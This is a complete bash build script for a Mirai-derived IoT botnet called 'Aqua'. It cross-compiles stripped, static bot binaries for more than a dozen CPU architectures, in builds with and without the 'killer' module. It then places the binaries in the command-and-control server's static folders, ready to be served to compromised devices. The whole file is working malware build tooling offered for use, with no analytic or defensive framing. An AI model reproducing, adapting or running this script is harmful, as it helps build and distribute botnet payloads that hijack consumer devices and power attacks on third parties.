#!/bin/bash

export PATH=$PATH:/etc/xcompile/arc/bin
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i486/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/i686/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/x86_64/bin

function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -s -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2"  -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
                                                                                                                                                                                                               
function compile_armv7 {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
}
                                                                                                                                                                                      
rm -rf ~/release
mkdir ~/release
mkdir ~/cnc/assets/static/no_killer

echo "Compiling - x86 [Killer Enabled]"
compile_bot i586 Aqua.x86 "-static -DKILLER"

echo "Compiling - debug [Killer Enabled]"
compile_bot x86_64 Aqua.dbg "-static -DDEBUG -DKILLER"

echo "Compiling - i686 [Killer Enabled]"
compile_bot i686 Aqua.i686 "-static -DKILLER"

echo "Compiling - X86_64 [Killer Enabled]"
compile_bot x86_64 Aqua.x86_64 "-static -DKILLER"

echo "Compiling - MIPS [Killer Enabled]"
compile_bot mips Aqua.mips "-static -DKILLER"

echo "Compiling - MIPSEL [Killer Enabled]"
compile_bot mipsel Aqua.mpsl "-static -DKILLER"

echo "Compiling - ARM/ARMv4 [Killer Enabled]"
compile_bot armv4l Aqua.arm4 "-static -DKILLER"

echo "Compiling - ARMv5 [Killer Enabled]"
compile_bot armv5l Aqua.arm5 "-static -DKILLER"

echo "Compiling - ARMv6 [Killer Enabled]"
compile_bot armv6l Aqua.arm6 "-static -DKILLER"

echo "Compiling - ARMv7 [Killer Enabled]"
compile_armv7 armv7l Aqua.arm7 "-static -DKILLER"

echo "Compiling - POWERPC [Killer Enabled]"
compile_bot powerpc Aqua.ppc "-static -DKILLER"

echo "Compiling - SPARC [Killer Enabled]"
compile_bot sparc Aqua.spc "-static -DKILLER"

echo "Compiling - M68K [Killer Enabled]"
compile_bot m68k Aqua.m68k "-static -DKILLER"

echo "Compiling - SH4 [Killer Enabled]"
compile_bot sh4 Aqua.sh4 "-static -DKILLER"

mv ~/release/Aqua.* ~/cnc/assets/static/

echo "Compiling - x86 [Killer Disabled]"
compile_bot i586 Aqua.x86 "-static"

echo "Compiling - debug [Killer Disabled]"
compile_bot x86_64 Aqua.dbg "-static -DDEBUG"

echo "Compiling - i686 [Killer Disabled]"
compile_bot i686 Aqua.i686 "-static"

echo "Compiling - X86_64 [Killer Disabled]"
compile_bot x86_64 Aqua.x86_64 "-static"

echo "Compiling - MIPS [Killer Disabled]"
compile_bot mips Aqua.mips "-static"

echo "Compiling - MIPSEL [Killer Disabled]"
compile_bot mipsel Aqua.mpsl "-static"

echo "Compiling - ARM/ARMv4 [Killer Disabled]"
compile_bot armv4l Aqua.arm4 "-static"

echo "Compiling - ARMv5 [Killer Disabled]"
compile_bot armv5l Aqua.arm5 "-static"

echo "Compiling - ARMv6 [Killer Disabled]"
compile_bot armv6l Aqua.arm6 "-static"

echo "Compiling - ARMv7 [Killer Disabled]"
compile_armv7 armv7l Aqua.arm7 "-static"

echo "Compiling - POWERPC [Killer Disabled]"
compile_bot powerpc Aqua.ppc "-static"

echo "Compiling - SPARC [Killer Disabled]"
compile_bot sparc Aqua.spc "-static"

echo "Compiling - M68K [Killer Disabled]"
compile_bot m68k Aqua.m68k "-static"

echo "Compiling - SH4 [Killer Disabled]"
compile_bot sh4 Aqua.sh4 "-static"

mv ~/release/Aqua.* ~/cnc/assets/static/no_killer
rm -rf ~/release
